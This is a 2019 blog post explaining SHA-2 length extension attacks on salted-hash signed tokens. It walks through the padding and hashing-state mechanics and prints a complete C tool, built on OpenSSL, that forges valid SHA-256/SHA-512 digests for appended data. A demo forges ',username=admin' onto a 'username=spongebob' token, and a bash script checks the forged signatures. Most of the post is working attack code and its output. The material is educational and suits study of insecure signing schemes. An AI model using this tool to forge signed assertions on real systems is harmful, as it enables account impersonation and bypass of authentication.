---
layout: article
show_edit_on_github: false
title:  "Length extension attacks&#58 the SHA2 algorithm"
date:   2019-03-01 17:00 +1300
modify_date:   2019-03-01 17:00 +1300
tags:   crypto signatures attack
aside:
  toc: true
---

Many authentication/authorization implementations rely on signed assertions. JWT, SAML and two popular examples. If the signature is a plain salted hash of the message, then it's possible to append arbitrary data to the message and generate a new valid signature, without knowing the salt&#x2014;the so called "Length extension attack".

<!--more-->

# Background

In theory when the digest of a message, `msg`, is known, the digest `sha2(msg + padding + newmsg)` can be calculated without knowing the original message `msg`.
`padding` is of the form `\x80\x00...\x00\x??\x??...\x??` where the number of zero bytes is such that `length(msg + padding)` is a multiple of the block size (64 bytes for SHA256 and 128 bytes for SHA512). The final `\x??` bytes are `length(msg)` as a big-endian 64-bit (SHA256) or 128-bit (SHA512) integer.

In practice one often knows the message, `msg`, but the digest is salted, i.e. it is `sha2(salt + msg)` for some unknown salt. The attack still applies: the digest `sha2(salt + msg + padding + newmsg)` can be calculated without knowing the salt. A practical example is when a web application generates a signed authentication token of the form `user_info.digest(salt + user_info)`. The user can then append arbitrary content to `user_info` and generate a valid signature for the new message. If the application parses `user_info` in an insecure way, the user may authenticate as a different user. For example if `user_info` is a serialized object of some sort, then properties specified later override previous ones, so `username=spongebob,username=admin` would authenticate as `admin`.

# Implementing the attack

One can use any language that has an implementation of the hashing algorithm in question, and which allows you to modify the hashing state (referred to as context from now on) before generating the digest. I chose C and the OpenSSL libraries for SHA2. The naming of the state variables closely follows that on [Wikipedia](https://en.wikipedia.org/wiki/SHA-2#Pseudocode):

```cpp
# define SHA_LBLOCK      16
# define SHA256_CBLOCK   (SHA_LBLOCK*4)/* SHA-256 treats input data as a
                                        * contiguous array of 32 bit wide
                                        * big-endian values. */
#  define SHA512_CBLOCK  (SHA_LBLOCK*8)/* SHA-512 treats input data as a
                                        * contiguous array of 64 bit
                                        * wide big-endian values.
                                        */
typedef struct SHA256state_st {
    SHA_LONG h[8];
    SHA_LONG Nl, Nh;
    SHA_LONG data[SHA_LBLOCK];
    unsigned int num, md_len;
} SHA256_CTX;

typedef struct SHA512state_st {
    SHA_LONG64 h[8];
    SHA_LONG64 Nl, Nh;
    union {
        SHA_LONG64 d[SHA_LBLOCK];
        unsigned char p[SHA512_CBLOCK];
    } u;
    unsigned int num, md_len;
} SHA512_CTX;
```

Most implementations (including OpenSSL's) use "Init", "Update" and "Digest" to setup the context, add content to it (e.g. `newmsg`) and generate the final digest respectively. Usually the state is unusable after digesting it.

OpenSSL's implementation keeps track of the current data buffer (of size equal to the digest size) and separately, of the length of the entire content appended so far (may be longer than the digest size). When copying content to the state (using `SHA???_Update`) it will copy up to the end of the data buffer, then update the 8 hash values (the `h` field) from it using `sha???_block_data_order`, clear the data buffer and continue copying into the beginning of the buffer. `sha???_block_data_order` does not depend on the current length field (`Nh` and `Nl`), so we only need to call `SHA???_Update` with `newmsg` once, at the start. The digest changes only when `length(salt + msg) mod (block size)` wraps around.

In short, the steps to append `newmsg` to `msg` and generate a valid hash using the original unknown salt are (may differ if using a different SHA2 implementation):

1. Initialise a hashing context, using e.g. `SHA256_Init`. This will set all of the constants for this algorithm.
2. Reset the 8 hash values of the context to the known digest (converting the hex string to a number).
3. For each guess of `l = length(salt + msg)` set the `Nh` and `Nl` fields of the hashing context to the high and low bits of `l`. SHA256 uses 64-bit length field, so `Nh` and `Nl` are the high 32 bits of `l`. SHA512 uses a 128-bit length field, so `Nh` and `Nl` are the high 64 bits of `l`.
4. Print the resulting padding. If the digest has changed (i.e. `l` has wrapped around), also print the new digest.

The current version of the code, along with installation instructions lives [here](https://github.com/aayla-secura/length_extension). The code as of March 3rd 2019 is included in the [Appendix](#appendix-source-code).

## Demo

Let's see it in action. For example purposes our message `msg` will be `username=spongebob`, the salt will be `secret$`, and the signature will be `sha256(salt+msg)`:

```console
$ echo -n 'secret$username=spongebob' | sha2 -q -256
be683fef295486e524cc43c3734fc52807e5b982bcb8791b8d3fa556d0a3408e
```

We'll try guesses for `l` from 24 to 26 (in fact it's 25):

```console
$ sha_lext_attack -d be683fef295486e524cc43c3734fc52807e5b982bcb8791b8d3fa556d0a3408e -m ',username=admin' -l 24 -L 26
digest: 69875b528bbac3363c0e1666af8320f2f01e222d38b0a793dea3b97006bad654
   24   \x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0
   25   \x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8
   26   \x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0
```
Check that the padding for length 25 (and not the other ones) indeed gives the correct digest:

```console
$ echo -n -e 'secret$username=spongebob\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0,username=admin' | sha2 -256 -q
6a8f75b9c21c0bc46ed1fefb64f9fe0e64757c10881e90d5a40cc491afdaf878
$ echo -n -e 'secret$username=spongebob\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8,username=admin' | sha2 -256 -q
69875b528bbac3363c0e1666af8320f2f01e222d38b0a793dea3b97006bad654
$ echo -n -e 'secret$username=spongebob\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0,username=admin' | sha2 -256 -q
1adc492bdb51ef8143497b5ab9ec85ff80940836d5e4a72cbe2faa620c7648fe
```

The source repo also has a demo script that will validate the correct padding for `salt + msg + newmsg`, given `msg` and `newmsg` (`salt` is randomly generated). It's solely for example purposes and to check the code for bugs. Script as of March 3rd 2019:

```bash
#!/bin/bash

DEBUG=0
SALT=$(xxd -p -l 8 < /dev/urandom | tr -d '\n')

usage() {
  cat <<EOF
Usage:
  ${BASH_SOURCE[0]} 256|512 <orig msg> <new msg>
EOF
exit 1
}

gen_sig() {
    local msgfile="$1" sig
    sig=$( (echo -n "$SALT" ; cat "$msgfile" ) | $ALGO | cut -d\  -f1 | tr -d '\n' )
    echo "$sig"
}

ver_sig() {
    local msgfile="$1" sig="$2" truesig
    truesig=$(gen_sig "$msgfile")
    (( DEBUG )) && echo -e "  $sig\n  vs\n  $truesig" >&2
    if [[ $sig != $truesig ]] ; then
        echo "Invalid signature"
    else
        echo "Good signature"
    fi
}

sha="$1"
msg="$2"
newmsg="$3"
[[ -n $sha && -n $msg && -n $newmsg ]] || usage

ALGO="sha${sha}sum"
if ! /usr/bin/which $ALGO >/dev/null ; then
  if ! /usr/bin/which sha2 >/dev/null ; then
    echo "Can't find sha2 utility. Ensure that either $ALGO or sha2 is installed and in your PATH"
    exit 1
  fi
  ALGO="sha2 -${sha} -q"
fi

explen=$(( ${#SALT} + ${#msg} ))
msgfile=$(mktemp)
newmsgfile=$(mktemp)
echo -n "$msg" > "$msgfile"

sig=$(gen_sig "$msgfile")
minlen=${#msg}
maxlen=$(( explen + 128 ))
echo "Seeding with $sig"
echo "Generated random salt of length ${#SALT}: $SALT"
echo "Trying length of salt+original message: from $minlen to $maxlen. Correct one should be $explen."
while read -r one two ; do
    if [[ "$one" == digest* ]] ; then
        newsig="$two"
        (( DEBUG )) && echo "NEW: $newsig" >&2
    else
        len="$one"
        padding="$two"
        (echo -n "${msg}" ; echo -e -n "${padding}" ; echo -n "${newmsg}") > "$newmsgfile"
        (( DEBUG )) && echo "LEN: $len" >&2
        res=$(ver_sig "$newmsgfile" "$newsig")
        if [[ $res == Good* ]] ; then
            echo "Good signature for length(salt+msg) = $len:"
            echo "$newsig"
            if [[ $len -eq $explen ]] ; then
                exit 0
            else
                echo "Expected good sig at length $explen"
                exit 1
            fi
        fi
    fi
done < <(./sha_lext_attack -m "$newmsg" -d "$sig" -l $minlen -L $maxlen -s 1)

rm "$msgfile"
rm "$newmsgfile"
echo "Couldn't find a good signature"
exit 1
```

# Appendix: Source code

```cpp
#include <openssl/sha.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <assert.h>

#ifdef USE_SHA256
typedef SHA256_CTX ctx_t;
#  define CBLOCK_LEN SHA256_CBLOCK
#  define MD_LEN     SHA256_DIGEST_LENGTH
#  define CTX_INIT   SHA256_Init
#  define CTX_UPDATE SHA256_Update
#  define CTX_FINAL  SHA256_Final
#  define CTX_DFMT   "%08x"
// length of the message is given by a 8-byte number
#  define CBLOCK_AVAIL_LEN  (CBLOCK_LEN - 1 - 8)
#  define CTX_DLEN   32 // size of message sched. array word in bits
#  define CTX_LMASK  0xFFFFFFFF
#else
typedef SHA512_CTX ctx_t;
#  define CBLOCK_LEN SHA512_CBLOCK
#  define MD_LEN     SHA512_DIGEST_LENGTH
#  define CTX_INIT   SHA512_Init
#  define CTX_UPDATE SHA512_Update
#  define CTX_FINAL  SHA512_Final
#  define CTX_DFMT   "%016llx"
// length of the message is given by a 16-byte number
#  define CBLOCK_AVAIL_LEN  (CBLOCK_LEN - 1 - 16)
#  define CTX_DLEN   64 // size of message sched. array word in bits
#  define CTX_LMASK  0xFFFFFFFFFFFFFFFF
#endif

// number of hex chars in the digest (2 hex chars per byte)
#define MD_HEXLEN  (MD_LEN*2)
// number of hex chars in a block (CTX_DLEN/8 * 2 hex chars per byte)
#define CTX_DHEXLEN (CTX_DLEN >> 2)

#define DUMP_ROW_LEN  8 // how many bytes per row when dumping buf
#define DUMP_OFF_LEN  5 // how many digits to use for the offset

#define ANSI_FG_RED     "\x1b[31m"
#define ANSI_FG_GREEN   "\x1b[32m"
#define ANSI_FG_YELLOW  "\x1b[33m"
#define ANSI_FG_BLUE    "\x1b[34m"
#define ANSI_FG_MAGENTA "\x1b[35m"
#define ANSI_FG_CYAN    "\x1b[36m"
#define ANSI_BG_RED     "\x1b[41m"
#define ANSI_BG_GREEN   "\x1b[42m"
#define ANSI_BG_YELLOW  "\x1b[43m"
#define ANSI_BG_BLUE    "\x1b[44m"
#define ANSI_BG_MAGENTA "\x1b[45m"
#define ANSI_BG_CYAN    "\x1b[46m"
#define ANSI_RESET      "\x1b[0m"
#define ANSI_BOLD       "\x1b[1m"

#define DEFAULT_MIN_MSG_L 1
#define DEFAULT_MAX_MSG_L 1024
#define DEFAULT_STEP      1

static void usage (const char* progname);
static int hexchar2num (char c);
static int set_ctx_md (ctx_t* ctx, const char* hex);
static void print_md (const unsigned char* md);
static void dump_buf (void* buf_, uint32_t len);
static void dump_ctx (ctx_t* ctx);

static void
usage (const char* progname)
{
	fprintf (stderr,
		ANSI_BOLD "Usage: " ANSI_RESET "%s " ANSI_FG_CYAN "<options>" ANSI_RESET "\n\n"
		ANSI_BOLD "Options:\n" ANSI_RESET
		ANSI_FG_CYAN "  -m <str>     " ANSI_RESET "Message to append.\n"
		ANSI_FG_CYAN "  -d <hex str> " ANSI_RESET "Digest to begin with.\n"
		ANSI_FG_CYAN "  -l <int>     " ANSI_RESET "Minimum length of salt + original message.\n"
		             "               "            "Default is %d.\n"
		ANSI_FG_CYAN "  -L <int>     " ANSI_RESET "Maximum length of salt + original message.\n"
		             "               "            "Default is %d.\n"
		ANSI_FG_CYAN "  -s <int>     " ANSI_RESET "Step to increment length.\n"
		             "               "            "Default is %d.\n",
		progname, DEFAULT_MIN_MSG_L, DEFAULT_MAX_MSG_L, DEFAULT_STEP);
	exit (EXIT_FAILURE);
}

int main (int argc, char *argv[])
{
	assert (MD_HEXLEN == 8*CTX_DHEXLEN); /* digest is in 8 blocks */
	ctx_t ctx;
	memset (&ctx, 0, sizeof (ctx_t));
	assert (sizeof (ctx.h[0])*2 == CTX_DHEXLEN);
	
	CTX_INIT (&ctx);
#ifdef ENABLE_DEBUG
	printf ("Init:\n");
	dump_ctx (&ctx);
#endif
	
	if (argc == 1)
		usage (argv[0]);
	
	int opt;
	unsigned long long msg_l = 0, step = DEFAULT_STEP,
		min_l = DEFAULT_MIN_MSG_L, max_l = DEFAULT_MAX_MSG_L;
	char *msg = NULL, *buf = NULL;
	char opts_seen[128] = {0};
	while ( (opt = getopt (argc, argv, "s:l:L:m:d:h")) != -1 )
	{
		if (opts_seen[opt])
		{
			fprintf (stderr, "Duplicate option\n");
			exit (EXIT_FAILURE);
		}
		opts_seen[opt] = 1;
		
		switch (opt)
		{
			case 'm':
				msg_l = strlen (optarg);
				msg = (char*)malloc (msg_l+1);
				if (msg == NULL)
				{
					perror ("");
					exit (EXIT_FAILURE);
				}
				snprintf (msg, msg_l+1, "%s", optarg);
				break;
			case 'd':
				if (set_ctx_md (&ctx, optarg) == -1)
					exit (EXIT_FAILURE);
				break;
			case 's':
			case 'l':
			case 'L':
				if (opt == 'l')
					min_l = strtoll (optarg, &buf, 10);
				else if (opt == 'L')
					max_l = strtoll (optarg, &buf, 10);
				else
					step = strtoll (optarg, &buf, 10);
				if (strlen (buf))
					usage (argv[0]);
				break;
			case 'h':
			case '?':
				usage (argv[0]);
				break;
			default:
				/* forgot to handle an option */
				assert (0);
		}
	}
	if (! opts_seen[(int)'m'])
	{
		fprintf (stderr, "Message is required\n");
		exit (EXIT_FAILURE);
	}
	if (! opts_seen[(int)'d'])
	{
		fprintf (stderr, "Initial digest is required\n");
		exit (EXIT_FAILURE);
	}
	assert (msg != NULL);
	
	/* Padding for the initial salt+original message length (min_l). */
	ssize_t npads = CBLOCK_AVAIL_LEN - (min_l % CBLOCK_LEN);
	if (npads < 0)
		npads += CBLOCK_LEN;
	assert (npads >= 0 && npads < CBLOCK_LEN);
	
	/* lpadded is a multiple of the block size: length of salt+original
	* message + 1 (accounting for \x80) + the no. of zero pads + the
	* size of the length field */
	unsigned long long lpadded = min_l + npads + CBLOCK_LEN - CBLOCK_AVAIL_LEN;
	assert (lpadded % CBLOCK_LEN == 0);
	ctx.Nl = ((lpadded << 3) & CTX_LMASK);
	ctx.Nh = (lpadded >> (CTX_DLEN - 3));
	/* Append the new message, it will start at the beginning of a new
	* block */
	CTX_UPDATE (&ctx, msg, strlen (msg));
	
	/* Calling CTX_FINAL on the ctx context will render it unusable for
	* further modifications. So we instead copy ctx to ctxtmp every
	* time we need to print the digest, and call CTX_FINAL on ctxtmp */
	ctx_t ctxtmp;
	memcpy (&ctxtmp, &ctx, sizeof (ctx_t));
	unsigned char md[MD_LEN] = {0};
	CTX_FINAL (md, &ctxtmp);
	printf ("digest:\t");
	print_md (md);
	
	for (unsigned long long l = min_l; l <= max_l; l += step)
	{
		/* Print padding... */
		printf ("%5llu\t\\x80", l);
#ifdef ENABLE_DEBUG
		printf (" + \\x00 x %lu + ", npads);
#else
		for (size_t i = 0; i < (size_t)npads; i++)
			printf ("\\x00");
#endif
		/* ... and length field in big-endian */
		unsigned long long Nl = ((l << 3) & CTX_LMASK);
		unsigned long long Nh = (l >> (CTX_DLEN - 3));
		for (int s = (CTX_DLEN - 8); s >=0; s -= 8)
			printf ("\\x%02x", (unsigned char)((Nh >> s) & 0xFF));
		for (int s = (CTX_DLEN - 8); s >=0; s -= 8)
			printf ("\\x%02x", (unsigned char)((Nl >> s) & 0xFF));
		printf ("\n");
		
		npads -= step;
		while (npads < 0)
		{
			/* Starting a new block; digest changes here, print it */
			npads += CBLOCK_LEN;
			ctx.Nl += (CBLOCK_LEN << 3);
			if(ctx.Nl < (CBLOCK_LEN << 3))
				ctx.Nh++; /* wrapped around */
			if (npads < 0)
				continue;
			memcpy (&ctxtmp, &ctx, sizeof (ctx_t));
			unsigned char md[MD_LEN] = {0};
			CTX_FINAL (md, &ctxtmp);
			printf ("digest:\t");
			print_md (md);
		}
	}

	exit (EXIT_SUCCESS);
}

static int
hexchar2num (char c)
{
	if (c > 47 && c < 58)
		return (c - 48); /* ASCII 0 to 9 */
	if (c > 64 && c < 71)
		return (c - 55); /* ASCII A to F */
	if (c > 96 && c < 103)
		return (c - 87); /* ASCII a to f */
	return -1;
}

static int
set_ctx_md (ctx_t* ctx, const char* hex)
{
	if (strlen (hex) != MD_HEXLEN)
	{
		fprintf (stderr, "Wrong digest length %lu. "
			"Using digest length of %d\n", strlen (hex), MD_HEXLEN);
		return -1;
	}
	
	memset (ctx->h, 0, sizeof (ctx->h));
	size_t id = 0;
	for (size_t i = 0; i < MD_HEXLEN; i++)
	{
		if (i % CTX_DHEXLEN == 0 && i > 0)
		{
#ifdef ENABLE_DEBUG
			printf ("digest[%lu]: 0x" CTX_DFMT "\n", id, ctx->h[id]);
#endif
			id++;
		}

		int rc = hexchar2num (hex[i]);
		if (rc == -1)
		{
			printf ("Invalid character: %c\n", hex[i]);
			return -1;
		}
		assert (id < 8);
		ctx->h[id] |= ((uint64_t)rc) << 4*((MD_HEXLEN-i-1) % CTX_DHEXLEN);
	}
#ifdef ENABLE_DEBUG
		printf ("digest[%lu]: 0x" CTX_DFMT "\n", id, ctx->h[id]);
#endif
	return 0;
}

static void
print_md (const unsigned char* md)
{
	for (size_t i = 0; i < MD_LEN; i++)
		printf ("%02x", md[i]);
	printf ("\n");
}

/*************************************************************
 *                           DEBUG
 *************************************************************/

static void
dump_buf (void* buf_, uint32_t len)
{
	const unsigned char* buf = (const unsigned char*) buf_;
	char tmp[ 4*DUMP_ROW_LEN + DUMP_OFF_LEN + 2 + 1 ] = {0};

	for (uint32_t r = 0; r < len; r += DUMP_ROW_LEN) {
		sprintf (tmp, "%0*x: ", DUMP_OFF_LEN, r);

		/* hexdump */
		for (uint32_t b = 0; b < DUMP_ROW_LEN && b+r < len; b++)
			sprintf (tmp + DUMP_OFF_LEN + 2 + 3*b, "%02x ",
				(uint8_t)(buf[b+r]));

		/* ASCII dump */
		for (uint32_t b = 0; b < DUMP_ROW_LEN && b+r < len; b++)
			sprintf (tmp + DUMP_OFF_LEN + 2 + b + 3*DUMP_ROW_LEN,
				"%c", isprint (buf[b+r]) ? buf[b+r] : '.');

		printf ("%s\n", tmp);
	}
	printf ("\n");
}

static void
dump_ctx (ctx_t* ctx)
{
	printf (
		"  Nl:     0x" CTX_DFMT "\n"
		"  Nh:     0x" CTX_DFMT "\n"
		"  num:    %d\n"
		"  md_len: %d\n",
		ctx->Nl,
		ctx->Nh,
		ctx->num,
		ctx->md_len);
	for (int i = 0; i < 8; i++)
		printf (
			"  h%02d:    0x" CTX_DFMT "\n", i, ctx->h[i]);
#ifdef USE_SHA256
	dump_buf (ctx->data, CBLOCK_LEN);
#else
	dump_buf (ctx->u.p, CBLOCK_LEN);
#endif
	printf ("\n");
}
```

## Usage

```
Options:
  -m <str>     Message to append.
  -d <hex str> Digest to begin with.
  -l <int>     Minimum length of salt + original message.
               Default is 1.
  -L <int>     Maximum length of salt + original message.
               Default is 1024.
  -s <int>     Step to increment length.
               Default is 1.
```

# References and further reading

* Source code: [https://github.com/aayla-secura/length_extension](https://github.com/aayla-secura/length_extension)
* Wikipedia, duh: [https://en.wikipedia.org/wiki/Length_extension_attack](https://en.wikipedia.org/wiki/Length_extension_attack).
* And again wikipedia, duh: [https://en.wikipedia.org/wiki/SHA-2#Pseudocode](https://en.wikipedia.org/wiki/SHA-2#Pseudocode).
* OpenSSL's source code: [https://github.com/openssl/openssl/tree/master/crypto/sha](https://github.com/openssl/openssl/tree/master/crypto/sha)
